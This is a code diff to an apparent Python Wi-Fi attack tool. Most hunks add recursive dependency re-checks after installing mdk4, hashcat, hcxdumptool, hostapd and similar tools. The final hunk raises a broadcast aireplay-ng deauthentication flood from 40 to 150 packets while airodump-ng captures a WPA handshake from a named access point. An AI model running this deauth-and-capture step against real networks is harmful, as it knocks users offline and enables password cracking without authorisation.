@@ -99,6 +99,7 @@ def check_deps():
                                       text=True)
         if "Setting up mdk4" in install_mdk4.stdout:
             get_colours("\n[*] MDK4 Installed...", "blue")
+            check_deps() # Check for MDK4
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -116,6 +117,7 @@ def check_deps():
                                          text=True)
         if "Setting up Hashcat" in install_hashcat.stdout:
             get_colours("\n[*] Hashcat Installed...", "blue")
+            check_deps() # Another Check for HASHCAT
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -133,6 +135,7 @@ def check_deps():
                                             text=True)
         if "Setting up macchanger" in install_macchanger.stdout:
             get_colours("\n[*] Macchanger Installed...", "blue")
+            check_deps()
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -150,6 +153,7 @@ def check_deps():
                                            text=True)
         if "Setting up airmon-ng" in install_airmon_ng.stdout:
             get_colours("\n[*] Airmon-ng Installed...", "blue")
+            check_deps()
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -168,6 +172,7 @@ def check_deps():
         subprocess.run(["sudo", "apt", "install", "hcxtools"], stdout=subprocess.DEVNULL)
         if "Setting up hcxdumptool" in install_hcxdump.stdout:
             get_colours("\n[*] hcxdumpTool Installed...", "blue")
+            check_deps()
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -195,6 +200,7 @@ def check_deps():
                                          text=True)
         if "Setting up dnsmasq" in install_dnsmasq.stdout:
             get_colours("\n[*] Dnsmasq Installed...", "blue")
+            check_deps()
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -212,6 +218,7 @@ def check_deps():
                                          text=True)
         if "Setting up hostapd" in install_hostapd.stdout:
             get_colours("\n[*] Dnsmasq Installed...", "blue")
+            check_deps()
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -306,8 +313,8 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[*] Waiting for the Handshake", 'cyan')
         os.system(
             f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface} &")
-        time.sleep(5)
-        os.system(f"xterm -hold -e aireplay-ng -0 40 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
+        time.sleep(6)
+        os.system(f"xterm -hold -e aireplay-ng -0 150 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
         time.sleep(2)
         subprocess.run(["clear"])
         script_banner()
